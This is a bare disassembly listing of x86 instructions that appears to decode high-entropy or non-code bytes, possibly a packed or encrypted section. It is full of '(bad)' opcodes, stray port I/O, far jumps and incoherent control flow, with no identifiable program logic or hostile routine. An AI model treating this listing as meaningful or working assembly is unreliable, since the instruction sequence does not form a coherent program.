  42ef68:	ja     0x42ef9f
  42ef6a:	out    dx,al
  42ef6b:	pop    ebp
  42ef6c:	cmc    
  42ef6d:	jne    0x42ef7b
  42ef6f:	test   ch,bl
  42ef71:	aam    0xc4
  42ef73:	and    BYTE PTR [edi-0xf],bl
  42ef76:	mov    ebx,0x8f29122f
  42ef7b:	jecxz  0x42ef6e
  42ef7d:	jns    0x42ef08
  42ef7f:	pop    edi
  42ef80:	pop    eax
  42ef81:	pusha  
  42ef82:	imul   edi,edi,0xedc29a69
  42ef88:	mov    eax,0xc385d876
  42ef8d:	pop    ss
  42ef8e:	leave  
  42ef8f:	dec    esp
  42ef90:	inc    esi
  42ef91:	sub    ebp,ecx
  42ef93:	pop    eax
  42ef94:	add    al,0xd9
  42ef96:	mov    cl,dl
  42ef98:	xchg   ebp,eax
  42ef99:	dec    ebp
  42ef9a:	test   BYTE PTR fs:[esi],dl
  42ef9d:	mov    edx,0x3a78cc5a
  42efa2:	cmp    eax,0xb832c724
  42efa7:	fcmovu st,st(5)
  42efa9:	mov    ds:0xbdbc66f8,al
  42efae:	pushw  cs
  42efb0:	jl     0x42f015
  42efb2:	pop    ds
  42efb3:	in     eax,dx
  42efb4:	cmp    ebx,DWORD PTR ds:0xb48ce4e2
  42efba:	pop    esi
  42efbb:	fcmovb st,st(2)
  42efbd:	in     al,dx
  42efbe:	sub    ecx,DWORD PTR [ecx-0x1a]
  42efc1:	dec    edi
  42efc2:	(bad)  
  42efc3:	fdivr  DWORD PTR [edx-0x6b]
  42efc6:	pop    DWORD PTR [ebx-0x449aec01]
  42efcc:	rcr    BYTE PTR [eax-0x24e30e57],1
  42efd2:	mov    edi,0x5a32a0ec
  42efd7:	fs jmp 0xfa6e:0xbefab28f
  42efdf:	(bad)  
  42efe0:	out    dx,al
  42efe1:	fwait
  42efe2:	adc    BYTE PTR [ebx+edx*4-0x515d6368],0xd5
  42efea:	push   ecx
  42efeb:	retf   0xda5f
  42efee:	(bad)  
  42efef:	jge    0x42f030
  42eff1:	stc    
  42eff2:	arpl   bp,bx
  42eff4:	pusha  
  42eff5:	stos   DWORD PTR es:[edi],eax
  42eff6:	cwde   
  42eff7:	ror    ah,1
  42eff9:	or     al,BYTE PTR [ebx]
  42effb:	scas   al,BYTE PTR es:[edi]
  42effc:	call   0x5089814f
  42f001:	js     0x42f068
  42f003:	lock push esi
  42f005:	sbb    eax,0x4e98aa01
  42f00a:	sbb    eax,0x6469d801
  42f00f:	or     BYTE PTR [ecx+0x18aae88],ch
  42f015:	sub    BYTE PTR [eax],ch
  42f017:	mov    ah,0x4e
  42f019:	mov    esi,0x3dfa9cf6
  42f01e:	test   dh,0x1e
  42f021:	mov    cl,0xe4
  42f023:	lds    edi,FWORD PTR [edx-0x80]
  42f026:	sub    dl,BYTE PTR [esi]
  42f028:	aas    
  42f029:	mov    ds,ebx
  42f02b:	mov    ch,0x8b
  42f02d:	jb     0x42f02d
  42f02f:	lods   al,BYTE PTR ds:[esi]
  42f030:	jo     0x42f013
  42f032:	mov    ah,0x8
  42f034:	or     DWORD PTR [ecx+0x11bf73b1],0xee297f18
  42f03e:	mov    al,ds:0xf72be493
  42f043:	shl    DWORD PTR [ebp-0x5e53e503],cl
  42f049:	mov    bl,0x94
  42f04b:	ins    BYTE PTR es:[edi],dx
  42f04c:	mov    edi,0x35c1fce5
  42f051:	pushf  
  42f052:	cmp    dl,BYTE PTR [eax-0x5a]
  42f055:	int    0xb9
  42f057:	push   ebx
  42f058:	adc    al,0x59
  42f05a:	shl    BYTE PTR [ecx-0x70bb43b],0x79
  42f061:	push   ecx
  42f062:	xchg   edx,eax
  42f063:	and    al,0xd7
  42f065:	fsubr  st(5),st
  42f067:	xchg   edi,eax
  42f068:	jnp    0x42f041
  42f06a:	sbb    BYTE PTR [edi],bh
  42f06c:	sahf   
  42f06d:	out    0xc1,al
  42f06f:	jnp    0x42f0d7
  42f071:	or     BYTE PTR [ebp+esi*1+0x38df1b1],dh
  42f078:	and    al,0xe
  42f07a:	out    dx,al
  42f07b:	ret    
  42f07c:	jmp    0xdb40bab2
  42f081:	xor    BYTE PTR [edi-0x7b],dh
  42f084:	imul   ebx,DWORD PTR [ebx],0x646c9cbc
  42f08a:	xchg   BYTE PTR [edx+0x79],ch
  42f08d:	mov    DWORD PTR [edx-0x1e],eax
  42f090:	xor    BYTE PTR [eax+0x7f],0x1b
  42f094:	test   DWORD PTR [eax+0x3513a981],edi
  42f09a:	pushf  
  42f09b:	mov    ebp,0xcdab9493
  42f0a0:	mov    esp,0x2b8c48fc
  42f0a5:	(bad)  
  42f0a6:	cdq    
  42f0a7:	pop    ecx
  42f0a8:	mul    DWORD PTR [ecx+0x7d0be1b7]
  42f0ae:	mov    dl,cl
  42f0b0:	iret   
  42f0b1:	call   FWORD PTR [edi]
  42f0b3:	bound  ecx,QWORD PTR [edi]
  42f0b5:	cmp    eax,0xbe367446
  42f0ba:	pop    esp
  42f0bb:	sub    eax,0x5ea705a8
  42f0c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f0c1:	push   ecx
  42f0c2:	loope  0x42f06a
  42f0c4:	pop    ecx
  42f0c5:	retf   
  42f0c6:	cli    
  42f0c7:	lock xchg ebx,eax
  42f0c9:	shl    DWORD PTR [esi-0x2a],0xed
  42f0cd:	sti    
  42f0ce:	sub    DWORD PTR [eax+edx*2-0x2d0dced],0x9174fc91
  42f0d9:	out    0x55,al
  42f0db:	push   cs
  42f0dc:	and    al,bh
  42f0de:	pop    ss
  42f0df:	xor    BYTE PTR [edx],bh
  42f0e1:	sub    al,0xf2
  42f0e3:	fdiv   QWORD PTR [esi]
  42f0e5:	(bad)  
  42f0e6:	pop    esi
  42f0e7:	sbb    DWORD PTR [edi+0x7f2b1267],edx
  42f0ed:	jp     0x42f073
  42f0ef:	(bad)  
  42f0f0:	into   
  42f0f1:	or     BYTE PTR [ecx+0x3b6d3b4c],bl
  42f0f7:	jnp    0x42f0a9
  42f0f9:	pop    ecx
  42f0fa:	pop    ebx
  42f0fb:	jno    0x42f171
  42f0fd:	xchg   edi,eax
  42f0fe:	dec    ecx
  42f0ff:	or     al,0x15
  42f101:	jmp    0xdd04bdbe
  42f106:	mov    eax,ds:0x6ebe8138
  42f10b:	mov    esp,0x7e25ef03
  42f110:	jmp    0xf62c:0x96364cb
  42f117:	jbe    0x42f11b
  42f119:	imul   edi,edx,0x30
  42f11c:	pop    ecx
  42f11d:	arpl   sp,ax
  42f11f:	inc    esi
  42f120:	addr16 pop ecx
  42f122:	adc    dh,BYTE PTR [ecx+eiz*2]
  42f125:	xor    al,0x78
  42f127:	lock xor al,0x87
  42f12a:	mov    al,0x5
  42f12c:	push   es
  42f12d:	mov    al,0xb7
  42f12f:	cmc    
  42f130:	nop
  42f131:	sbb    bh,bh
  42f133:	or     eax,0xcce3894b
  42f138:	push   cs
  42f139:	in     al,0x79
  42f13b:	std    
  42f13c:	div    BYTE PTR [ecx]
  42f13e:	push   0x63
  42f140:	aas    
  42f141:	out    0x58,eax
  42f143:	fbstp  TBYTE PTR [edi]
  42f145:	xchg   esi,eax
  42f146:	mov    eax,ds:0x3dfea2de
  42f14b:	dec    edx
  42f14c:	mov    ds:0xba7383c,eax
  42f151:	jo     0x42f1a0
  42f153:	push   edi
  42f154:	ficom  WORD PTR [esi+0x1a]
  42f157:	add    eax,0x59b4aa3f
  42f15c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f15d:	cmc    
  42f15e:	sub    cl,BYTE PTR [esi]
  42f160:	test   al,0x8e
  42f162:	add    eax,0x369fc755
  42f167:	sbb    cl,BYTE PTR [ecx+0x41]
  42f16a:	stos   BYTE PTR es:[edi],al
  42f16b:	ret    
  42f16c:	jb     0x42f1ce
  42f16e:	test   DWORD PTR [eax],esp
  42f170:	test   eax,0x2f555a54
  42f175:	adc    esp,edx
  42f177:	xlat   BYTE PTR ds:[ebx]
  42f178:	push   edx
  42f179:	aad    0xc6
  42f17b:	stos   DWORD PTR es:[edi],eax
  42f17c:	sub    DWORD PTR [ecx],edi
  42f17e:	sub    ah,BYTE PTR [esi-0x7c1a64e]
  42f184:	xchg   dl,ch
  42f186:	cmp    ebx,DWORD PTR [eax+0x3c]
  42f189:	and    esp,edi
  42f18b:	jns    0x42f1fa
  42f18d:	or     BYTE PTR [ebx-0x3719becf],ch
  42f193:	jns    0x42f171
  42f195:	(bad)  
  42f196:	mov    esi,0x6d96b9c4
  42f19b:	mov    dl,0x7e
  42f19d:	or     BYTE PTR [esi-0x69b3b13e],0x2
  42f1a4:	pop    esi
  42f1a5:	mov    bh,0xd6
  42f1a7:	sbb    DWORD PTR [eax+0x6b],ecx
  42f1aa:	sbb    BYTE PTR [ebx-0x48f7340],dh
  42f1b0:	test   DWORD PTR [ecx+eax*1-0x65],esi
  42f1b4:	fld    DWORD PTR [edi+ebp*1+0x76c36760]
  42f1bb:	pmaxub mm2,mm5
  42f1be:	cs (bad) 
  42f1c0:	lahf   
  42f1c1:	mov    esi,edx
  42f1c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f1c4:	add    cl,ch
  42f1c6:	iret   
  42f1c7:	in     al,0xc4
  42f1c9:	add    BYTE PTR [eax],bl
  42f1cb:	xor    ah,ah
  42f1cd:	sub    bl,BYTE PTR [edx+edi*2+0x73]
  42f1d1:	adc    BYTE PTR [eax+edx*8+0xd4125b3],0xfd
  42f1d9:	and    ch,BYTE PTR [edi]
  42f1db:	pop    ebp
  42f1dc:	(bad)  
  42f1dd:	dec    ebx
  42f1de:	sbb    DWORD PTR [ebx+0x6e75bbe3],edi
  42f1e4:	lods   al,BYTE PTR ds:[esi]
  42f1e5:	neg    BYTE PTR [edx+0x29]
  42f1e8:	test   BYTE PTR [edx-0x69ed536a],bl
  42f1ee:	push   esp
  42f1ef:	add    BYTE PTR [eax+0x75],bl
  42f1f2:	inc    eax
  42f1f3:	scas   al,BYTE PTR es:[edi]
  42f1f4:	mov    bh,0x31
  42f1f6:	xchg   ebx,eax
  42f1f7:	addr16 cs mov edi,0x3dc12b7d
  42f1fe:	jmp    0x42f269
  42f200:	mov    edx,0xe50a0ee3
  42f205:	add    al,0x46
  42f207:	jno    0x42f1fc
  42f209:	mov    bl,0xb2
  42f20b:	(bad)  
  42f20c:	jmp    0x67d17c2
  42f211:	jnp    0x42f1bc
  42f213:	stc    
  42f214:	mov    BYTE PTR cs:[edx+0x6],dl
  42f218:	test   eax,0xce246be5
  42f21d:	or     DWORD PTR [edx+0x11],esi
  42f220:	scas   eax,DWORD PTR es:[edi]
  42f221:	push   ds
  42f222:	cmp    edi,DWORD PTR [ebp-0x7b3f57d8]
  42f228:	mov    ebx,0xad5cab55
  42f22d:	mov    ebx,edx
  42f22f:	adc    BYTE PTR [ebx],al
  42f231:	mov    al,0x56
  42f233:	imul   ebx,DWORD PTR [eax+0x22],0xffffff8e
  42f237:	mov    cl,0x3f
  42f239:	retf   
  42f23a:	mov    cl,0x1f
  42f23c:	(bad)  
  42f23d:	sar    BYTE PTR [esi+0x45],1
  42f240:	pop    ds
  42f241:	fld    st(5)
  42f243:	lods   al,BYTE PTR ds:[esi]
  42f244:	mov    esp,0x26e0856f
  42f249:	daa    
  42f24a:	xchg   ebx,eax
  42f24b:	cmovg  esp,ebx
  42f24e:	jae    0x42f2a6
  42f250:	leave  
  42f251:	or     edi,esp
  42f253:	mov    bh,0x59
  42f255:	in     eax,0xab
  42f257:	fisttp DWORD PTR [edx+0x630e476f]
  42f25d:	test   eax,0xaa07f999
  42f262:	clc    
  42f263:	mov    ebx,0xfeef786c
  42f268:	popf   
  42f269:	cmp    al,cl
  42f26b:	sub    DWORD PTR [ecx-0x18d5951a],edi
  42f271:	push   ds
  42f272:	pusha  
  42f273:	dec    dl
  42f275:	iret   
  42f276:	mov    cl,0x4f
  42f278:	fidiv  WORD PTR [edi-0x76]
  42f27b:	(bad)  
  42f27c:	mov    BYTE PTR [esi*2+0x1df2a7e4],bh
  42f283:	push   esp
  42f284:	jl     0x42f209
  42f286:	adc    eax,0x71355e9e
  42f28b:	push   ebp
  42f28c:	into   
  42f28d:	inc    ecx
  42f28e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f28f:	mov    bl,BYTE PTR [ebx]
  42f291:	(bad)
  42f295:	inc    edx
  42f296:	mov    WORD PTR [edx+0x799caf0a],cs
  42f29c:	scas   al,BYTE PTR es:[edi]
  42f29d:	xchg   BYTE PTR [esp+ebp*2],bh
  42f2a0:	xchg   edx,eax
  42f2a1:	sub    edi,DWORD PTR [esi-0x4e9406cf]
  42f2a7:	mov    dh,0xbb
  42f2a9:	inc    ebp
  42f2aa:	leave  
  42f2ab:	shl    BYTE PTR [edx-0x10],cl
  42f2ae:	in     al,0x41
  42f2b0:	sub    eax,0x5c28136
  42f2b5:	and    cl,BYTE PTR [ebx+0x73]
  42f2b8:	xchg   esp,eax
  42f2b9:	or     ah,BYTE PTR [ebp+0x1c]
  42f2bc:	es pop ss
  42f2be:	pop    ss
  42f2bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f2c0:	jle    0x42f287
  42f2c2:	and    eax,0xb8a76fab
  42f2c7:	out    dx,eax
  42f2c8:	out    0xcc,eax
  42f2ca:	sub    eax,0x9ef7d18e
  42f2cf:	xlat   BYTE PTR ds:[ebx]
  42f2d0:	jecxz  0x42f27a
  42f2d2:	dec    ebp
  42f2d3:	push   ecx
  42f2d4:	xor    al,0xfd
  42f2d6:	cwde   
  42f2d7:	lahf   
  42f2d8:	jl     0x42f281
  42f2da:	fwait
  42f2db:	(bad)  
  42f2dc:	std    
  42f2dd:	dec    ebp
  42f2de:	mov    ah,0xb7
  42f2e0:	fisttp QWORD PTR [eax+0x64]
  42f2e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f2e4:	mov    bl,dl
  42f2e6:	rol    edx,1
  42f2e8:	fisubr DWORD PTR [ebp+0x5a]
  42f2eb:	jmp    0x3916:0xd7999c64
  42f2f2:	cmc    
  42f2f3:	fs push esp
  42f2f5:	or     al,0x44
  42f2f7:	xchg   esp,eax
  42f2f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f2f9:	xor    di,WORD PTR [ebx+0x33201fde]
  42f300:	adc    al,0x13
  42f302:	pop    eax
  42f303:	pop    ebp
  42f304:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f305:	mov    bh,0x6f
  42f307:	sbb    eax,0x811ad309
  42f30c:	sub    edx,DWORD PTR [esi]
  42f30e:	pushf  
  42f30f:	fisubr WORD PTR [ebp-0x3aa06afe]
  42f315:	sbb    DWORD PTR [edx+0x15],ebp
  42f318:	scas   al,BYTE PTR es:[edi]
  42f319:	cmc    
  42f31a:	lahf   
  42f31b:	repnz mov ds:0x5eb4b156,al
  42f321:	shl    dl,cl
  42f323:	out    0x55,al
  42f325:	mov    ebx,0x1e418c5d
  42f32a:	stos   DWORD PTR es:[edi],eax
  42f32b:	cmp    DWORD PTR [ecx+0x34],eax
  42f32e:	pop    ecx
  42f32f:	pusha  
  42f330:	int    0xce
  42f332:	mul    edx
  42f334:	push   0x70d499ba
  42f339:	xchg   esp,eax
  42f33a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f33b:	stos   DWORD PTR es:[edi],eax
  42f33c:	ficom  WORD PTR [eax+0x17]
  42f33f:	sub    cl,BYTE PTR [ebp+0x59]
  42f342:	push   esp
  42f343:	push   ds
  42f344:	js     0x42f2d0
  42f346:	inc    esi
  42f347:	cmp    DWORD PTR [ebx-0x2854a10e],ebp
  42f34d:	test   cl,bl
  42f34f:	je     0x42f34d
  42f351:	pop    ecx
  42f352:	dec    edx
  42f353:	mov    ecx,0xfb3dce05
  42f358:	sub    ebx,DWORD PTR [esi+edx*2-0x58780d1f]
  42f35f:	jmp    0x4670c93c
  42f364:	test   al,0x46
  42f366:	push   0x7a
  42f368:	pop    edx
  42f369:	or     al,0x5e
  42f36b:	sbb    ch,BYTE PTR [ebx-0x5e1b38d3]
  42f371:	mov    ebp,0x5a4c4624
  42f376:	rcr    BYTE PTR [esi-0x315f7e8a],0xfe
  42f37d:	retf   
  42f37e:	jmp    0xc30fca5f
  42f383:	dec    ecx
  42f384:	add    DWORD PTR [ebx+0x47f31376],0xa1f8d9e7
  42f38e:	jg     0x42f3b0
  42f390:	jb     0x42f40c
  42f392:	aas    
  42f393:	test   ecx,esi
  42f395:	push   ebx
  42f396:	xor    al,0xf5
  42f398:	xchg   DWORD PTR [ecx],esi
  42f39a:	push   0xffffff8d
  42f39c:	inc    ebx
  42f39d:	pop    edx
  42f39e:	ret    
  42f39f:	push   esp
  42f3a0:	xor    edx,DWORD PTR [ebx+0x44161744]
  42f3a6:	js     0x42f40c
  42f3a8:	dec    ebx
  42f3a9:	or     dl,BYTE PTR [esi]
  42f3ab:	or     cl,BYTE PTR [ecx+0x3b]
  42f3ae:	loope  0x42f38d
  42f3b0:	pop    ds
  42f3b1:	adc    esp,DWORD PTR [ebx-0x363f508f]
  42f3b7:	jecxz  0x42f3ab
  42f3b9:	jle    0x42f346
  42f3bb:	les    eax,FWORD PTR [edx]
  42f3bd:	inc    ebp
  42f3be:	jbe    0x42f37d
  42f3c0:	dec    BYTE PTR [eax+ebx*2-0x790d810b]
  42f3c7:	mov    ecx,DWORD PTR [edx+0x6b5e46ae]
  42f3cd:	pop    edi
  42f3ce:	ret    
  42f3cf:	cli    
  42f3d0:	jnp    0x42f37a
  42f3d2:	ss in  eax,0xaa
  42f3d5:	pop    edi
  42f3d6:	sbb    BYTE PTR [edx],0xf5
  42f3d9:	xchg   ebp,eax
  42f3da:	aad    0x3d
  42f3dc:	adc    BYTE PTR [edx-0x1e],0x14
  42f3e0:	(bad)  
  42f3e1:	fiadd  DWORD PTR [edi]
  42f3e3:	je     0x42f38a
  42f3e5:	push   eax
  42f3e6:	xchg   ecx,eax
  42f3e7:	jl     0x42f36e
  42f3e9:	push   ss
  42f3ea:	aam    0xac
  42f3ec:	cmp    edx,DWORD PTR [ebp-0x178559cf]
  42f3f2:	int    0xeb
  42f3f4:	adc    bl,0x4a
  42f3f7:	mov    ds:0x468846a9,eax
  42f3fc:	and    al,0xbd
  42f3fe:	push   ebp
  42f3ff:	(bad)  
  42f400:	fldcw  WORD PTR [ebx+ebx*1-0x52b2f2ae]
  42f407:	xchg   edi,eax
  42f408:	or     ebx,DWORD PTR [edi+edx*4-0x21]
  42f40c:	leave  
  42f40d:	enter  0xeb0b,0xb0
  42f411:	pop    edi
  42f412:	ins    DWORD PTR es:[edi],dx
  42f413:	shr    DWORD PTR [ebp-0x43],0x86
  42f417:	(bad)  
  42f419:	cmp    cl,ch
  42f41b:	addr16 pop esi
  42f41d:	lds    edi,FWORD PTR [esi-0x27]
  42f420:	pop    edx
  42f421:	pop    si
  42f423:	sbb    ch,al
  42f425:	adc    dh,dh
  42f427:	adc    BYTE PTR [eax],dl
  42f429:	sar    DWORD PTR [edi+0x8a4fcf0],0x7e
  42f430:	pop    esi
  42f431:	pusha  
  42f432:	scas   al,BYTE PTR es:[edi]
  42f433:	sub    BYTE PTR [esi+0x13ded328],ch
  42f439:	sub    DWORD PTR [esi],edi
  42f43b:	hlt    
  42f43c:	mov    cl,0x4e
  42f43e:	int3   
  42f43f:	pop    esi
  42f440:	cmp    edx,ebx
  42f442:	and    edi,DWORD PTR [ecx]
  42f444:	pop    edx
  42f445:	aaa    
  42f446:	stc    
  42f447:	sbb    edi,ebx
  42f449:	sbb    esp,DWORD PTR [edi]
  42f44b:	and    esi,DWORD PTR [edi+ebp*1]
  42f44e:	cdq    
  42f44f:	int3   
  42f450:	adc    ebp,esp
  42f452:	jo     0x42f467
  42f454:	fwait
  42f455:	dec    eax
  42f456:	mov    bl,0x7a
  42f458:	xchg   DWORD PTR [ebx-0x4c4a2792],edi
  42f45e:	(bad)  
  42f45f:	mov    dh,0xed
  42f461:	add    DWORD PTR [ebx+eax*1-0x1e4366e5],0xffffffdb
  42f469:	retf   
  42f46a:	jne    0x42f45d
  42f46c:	stos   BYTE PTR es:[edi],al
  42f46d:	push   0x72
  42f46f:	gs add ah,dl
  42f472:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f473:	sbb    eax,DWORD PTR [eax]
  42f475:	dec    ebp
  42f476:	out    dx,al
  42f477:	ret    
  42f478:	cli    
  42f479:	jp     0x42f4e4
  42f47b:	sub    BYTE PTR [esi+0x40],ah
  42f47e:	xchg   esp,eax
  42f47f:	and    BYTE PTR [eax+0x6edb1da9],dh
  42f485:	push   ecx
  42f486:	mov    dh,0x8f
  42f488:	mov    edi,0x34d38c5d
  42f48d:	xchg   ecx,eax
  42f48e:	mov    ds:0xb41161af,eax
  42f493:	fwait
  42f494:	mov    dl,BYTE PTR [esi-0x7876d2d7]
  42f49a:	(bad)  
  42f49c:	adc    dh,BYTE PTR ds:0xec5f4445
  42f4a2:	int3   
  42f4a3:	lahf   
  42f4a4:	fwait
  42f4a5:	(bad)  
  42f4a6:	xlat   BYTE PTR ds:[ebx]
  42f4a7:	jmp    0x552d:0xf42f0f17
  42f4ae:	and    BYTE PTR [esi],dh
  42f4b0:	xchg   esi,eax
  42f4b1:	mov    ds:0x9f924918,al
  42f4b6:	retf   
  42f4b7:	(bad)  
  42f4b8:	cmp    edx,DWORD PTR ds:0x60b4b7f9
  42f4be:	mov    bl,0x8b
  42f4c0:	mov    eax,ds:0x8a31c5b2
  42f4c5:	jae    0x42f497
  42f4c7:	dec    esi
  42f4c8:	sub    al,0x16
  42f4ca:	dec    esi
  42f4cb:	sub    al,0xd4
  42f4cd:	retf   
  42f4ce:	and    BYTE PTR [ebx-0x29],bl
  42f4d1:	push   edi
  42f4d2:	cdq    
  42f4d3:	jge    0x42f53f
  42f4d5:	xchg   ecx,eax
  42f4d6:	jb     0x42f48e
  42f4d8:	inc    edx
  42f4d9:	push   esi
  42f4da:	adc    BYTE PTR [ebx+0x5412683f],ch
  42f4e0:	pop    esp
  42f4e1:	mov    ds:0xc2796ef3,eax
  42f4e6:	jl     0x42f50f
  42f4e8:	rcr    edi,1
  42f4ea:	leave  
  42f4eb:	cmp    ecx,ebp
  42f4ed:	gs call 0xa8aac4ec
  42f4f3:	gs in  eax,0x73
  42f4f6:	aad    0x17
  42f4f8:	xor    DWORD PTR [esi],edi
  42f4fa:	xor    ah,cl
  42f4fc:	mov    eax,ds:0xa709fdbf
  42f501:	imul   ecx,DWORD PTR [ebp+0x14d56774],0x76
  42f508:	add    esi,0x1a798b0c
  42f50e:	in     eax,dx
  42f50f:	int3   
  42f510:	aam    0x3b
  42f512:	stos   DWORD PTR es:[edi],eax
  42f513:	and    ah,BYTE PTR [edi]
  42f515:	jne    0x42f4e3
  42f517:	ins    BYTE PTR es:[edi],dx
  42f518:	push   esi
  42f519:	jb     0x42f4ee
  42f51b:	mov    eax,ds:0x551060f
  42f520:	das    
  42f521:	sub    al,BYTE PTR [ecx+0x5407cd43]
  42f527:	sub    DWORD PTR [eax+0x5c64c56b],edx
  42f52d:	mov    bh,0x7e
  42f52f:	and    ebx,DWORD PTR [ebp+0xb141ffb]
  42f535:	pop    edx
  42f536:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f537:	xchg   edx,eax
  42f538:	dec    edi
  42f539:	push   edx
  42f53a:	mov    gs,WORD PTR [edx+eiz*2]
  42f53d:	adc    edi,DWORD PTR [eax]
  42f53f:	pop    esi
  42f540:	adc    DWORD PTR [eax+eiz*2],esi
  42f543:	adc    ebx,ebx
  42f545:	bound  esi,QWORD PTR [eax+0x3e8c502e]
  42f54b:	add    bl,0x7f
  42f54e:	pop    es
  42f54f:	icebp  
  42f550:	loope  0x42f531
  42f552:	lock bnd ja 0x42f4f5
  42f556:	loop   0x42f53e
  42f558:	push   ebp
  42f559:	fwait
  42f55a:	xor    BYTE PTR [ebp+eiz*2-0x4b],bh
  42f55e:	cmp    al,0xdc
  42f560:	daa    
  42f561:	js     0x42f543
  42f563:	add    DWORD PTR [ecx+0x16],0xc2bb8a45
  42f56a:	ss jbe 0x42f5d9
  42f56d:	mov    esi,0x2e4b8193
  42f572:	pop    ss
  42f573:	ret    
  42f574:	xor    ebx,ecx
  42f576:	arpl   di,bx
  42f578:	cld    
  42f579:	or     eax,DWORD PTR [edi-0x61]
  42f57c:	fwait
  42f57d:	shr    WORD PTR [esi-0x62e4c2e0],cl
  42f584:	cmc    
  42f585:	and    esi,DWORD PTR [ecx-0x4df11120]
  42f58b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f58c:	into   
  42f58d:	xor    BYTE PTR [eax],dh
  42f58f:	sbb    al,0x23
  42f591:	jae    0x42f57e
  42f593:	sub    eax,0xc8eb9c54
  42f598:	adc    eax,0x6eaa1832
  42f59d:	jns    0x42f540
  42f59f:	jns    0x42f5cb
  42f5a1:	xchg   BYTE PTR [esi+0x72],ch
  42f5a4:	arpl   di,si
  42f5a6:	popa   
  42f5a7:	not    DWORD PTR [esi+0x5e253b19]
  42f5ad:	jp     0x42f61c
  42f5af:	add    BYTE PTR [ebx+0x2b28cb53],dh
  42f5b5:	or     BYTE PTR [edi+0x643630ce],cl
  42f5bb:	loopne 0x42f5b7
  42f5bd:	(bad)  
  42f5bf:	pop    ss
  42f5c0:	fwait
  42f5c1:	scas   eax,DWORD PTR es:[edi]
  42f5c2:	xchg   ebx,eax
  42f5c3:	pop    edx
  42f5c4:	and    edi,eax
  42f5c6:	fdivr  QWORD PTR [ebx]
  42f5c8:	aas    
  42f5c9:	retf   0xd1e2
  42f5cc:	mov    bl,0xa4
  42f5ce:	and    bl,BYTE PTR [ecx-0x2ae59d1b]
  42f5d4:	repz dec edi
  42f5d6:	cmc    
  42f5d7:	test   eax,0xac3ce7a8
  42f5dc:	push   cs
  42f5dd:	mov    cl,0xfd
  42f5df:	aam    0x1
  42f5e1:	xchg   edx,eax
  42f5e2:	rol    edi,1
  42f5e4:	add    al,0x1
  42f5e6:	cmp    al,0x2d
  42f5e8:	imul   edx,DWORD PTR [eax],0x20
  42f5eb:	pop    ss
  42f5ec:	scas   eax,DWORD PTR es:[edi]
  42f5ed:	or     BYTE PTR [eax-0xf],bl
  42f5f0:	mov    dl,BYTE PTR [ecx+0x28]
  42f5f3:	retf   
  42f5f4:	iret   
  42f5f5:	repz pop eax
  42f5f7:	lods   eax,DWORD PTR ds:[esi]
  42f5f8:	or     DWORD PTR [ecx+0x4fc65eec],eax
  42f5fe:	psrlw  mm2,QWORD PTR [esp+ecx*8]
  42f602:	xor    esi,DWORD PTR [ebx+0x46]
  42f605:	mov    esp,0xa63746c7
  42f60a:	pop    edx
  42f60b:	adc    ebx,DWORD PTR [esi]
  42f60d:	icebp  
  42f60e:	add    ch,al
  42f610:	stc    
  42f611:	or     al,0x81
  42f613:	(bad)  
  42f614:	push   ss
  42f615:	push   ecx
  42f616:	imul   BYTE PTR [esi]
  42f618:	push   0x36
  42f61a:	mov    eax,ds:0x92f5348
  42f61f:	push   edx
  42f620:	jno    0x42f605
  42f622:	pop    ebx
  42f623:	sbb    ah,BYTE PTR [edx]
  42f625:	and    DWORD PTR [edi+0x28bafbdb],edi
  42f62b:	(bad)  
  42f62c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f62d:	enter  0x66d5,0x89
  42f631:	dec    esi
  42f632:	inc    esi
  42f633:	jo     0x42f5fd
  42f635:	jae    0x42f66e
  42f637:	pop    ebp
  42f638:	repnz push ss
  42f63a:	adc    esi,edi
  42f63c:	jle    0x42f5bf
  42f63e:	test   DWORD PTR [edi+0x463cc812],edi
  42f644:	push   ebx
  42f645:	sti    
  42f646:	sub    BYTE PTR [ecx+0x2bde8952],ch
  42f64c:	into   
  42f64d:	retf   
  42f64e:	jp     0x42f5db
  42f650:	loope  0x42f683
  42f652:	je     0x42f685
  42f654:	cs mov ebx,0x7174be7a
  42f65a:	or     edi,0xffffffaf
  42f65d:	inc    eax
  42f65e:	add    BYTE PTR [ecx+0x7d],bh
  42f661:	shl    DWORD PTR ds:0x57417003,cl
  42f667:	inc    eax
  42f668:	dec    ebp
  42f669:	mov    ecx,0xef4758b5
  42f66e:	or     ch,BYTE PTR [edi-0x41]
  42f671:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f672:	sub    ebp,DWORD PTR [ebx+0x3aa807ea]
  42f678:	loopne 0x42f622
  42f67a:	push   esp
  42f67b:	bound  edx,QWORD PTR ds:0x8ae973c8
  42f681:	adc    esp,DWORD PTR [eax+0x4d452c31]
  42f687:	push   edi
  42f688:	push   edx
  42f689:	daa    
  42f68a:	or     eax,0x2663dd29
  42f68f:	push   0xd9d417c4
  42f694:	jns    0x42f625
  42f696:	jle    0x42f627
  42f698:	dec    ebp
  42f699:	repnz mov ch,0x65
  42f69c:	jl     0x42f6b3
  42f69e:	rcr    edx,1
  42f6a0:	fisttp WORD PTR [eax+0x3225db77]
  42f6a6:	and    bh,BYTE PTR [ebx+0x3a]
  42f6a9:	jb     0x42f6ea
  42f6ab:	mov    cl,0x33
  42f6ad:	pop    ss
  42f6ae:	lds    esi,FWORD PTR [ebp-0x4d1f28e8]
  42f6b4:	xchg   ecx,eax
  42f6b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f6b6:	jae    0x42f71b
  42f6b8:	dec    esp
  42f6b9:	pop    ds
  42f6ba:	sbb    DWORD PTR [edx],esp
  42f6bc:	adc    BYTE PTR [ebx+esi*1],dh
  42f6bf:	xor    esp,DWORD PTR [ecx-0x3b]
  42f6c2:	push   ds
  42f6c3:	push   cs
  42f6c4:	shl    dl,1
